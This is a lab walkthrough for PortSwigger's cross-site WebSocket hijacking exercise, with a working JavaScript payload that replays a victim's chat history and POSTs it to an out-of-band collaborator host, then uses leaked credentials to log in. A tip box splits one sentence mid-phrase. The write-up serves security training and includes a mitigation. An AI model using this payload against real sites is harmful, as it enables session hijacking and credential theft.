# Lab 03 — Cross-site WebSocket hijacking

> **Expert** · [Official lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

**Entry point:** the WS handshake (`/chat`) carries no CSRF token and no

> 🔧 **Burp Community alternative:** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
Origin validation — any website can open the socket with the victim's
cookies.

## Solution

1. Note the handshake has no CSRF protection, and the `READY` command makes
   the server replay the **entire chat history**.
2. Host on the exploit server (Collaborator as the exfil endpoint):

```html
<script>
  var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
  ws.onopen = function() { ws.send("READY"); };
  ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-SUBDOMAIN',
          {method:'POST', mode:'no-cors', body:event.data});
  };
</script>
```

3. Test on yourself ("View exploit") — Collaborator receives your chat
   history.
4. **Deliver to victim**, poll Collaborator — their history includes their
   credentials — log in as the victim — lab solved.

## Mitigation

Validate the `Origin` header on the handshake and bind the WS session to a
CSRF-style nonce — the upgrade request is just an HTTP request.
